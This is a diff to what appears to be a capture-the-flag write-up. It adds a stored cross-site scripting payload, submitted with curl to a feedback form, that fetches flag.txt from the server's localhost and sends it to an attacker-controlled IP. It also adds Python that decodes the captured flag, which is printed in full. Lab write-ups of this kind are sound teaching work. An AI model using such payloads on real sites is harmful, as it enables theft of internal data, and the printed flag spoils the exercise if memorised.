@@ -71,6 +71,28 @@ python3 -m http.server 8000
   fetch('http://127.0.0.1:8080/flag.txt')
     .then(response => response.text())
     .then(data => {
-      fetch('http://<YOUR-IP-ADDRESS-tun0>:8000/?flag=' + encodeURIComponent(data));
+      fetch('http://10.8.136.212:8000/?flag=' + encodeURIComponent(data));
     });
 </script>
+
+# try it out
+
+curl -X POST http://10.10.59.111:8080/submit_feedback -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.10.59.111:8080" -H "Referer: http://10.10.59.111:8080/submit_feedback" --data-urlencode "feedback=<script>fetch('http://127.0.0.1:8080/flag.txt').then(response => response.text()).then(data => {fetch('http://10.8.136.212:9000?flag=' + encodeURIComponent(data));});</script>"
+
+# success
+
+![](https://velog.velcdn.com/images/agnusdei1207/post/6ca7e097-8ff7-41f9-8fa7-513c67a15eea/image.png)
+
+# let's decode
+
+```
+import urllib.parse
+
+encoded = "THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D"
+decoded = urllib.parse.unquote(encoded)
+
+print(decoded)
+
+```
+
+python3 -c "import urllib.parse; print(urllib.parse.unquote('THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D'))"
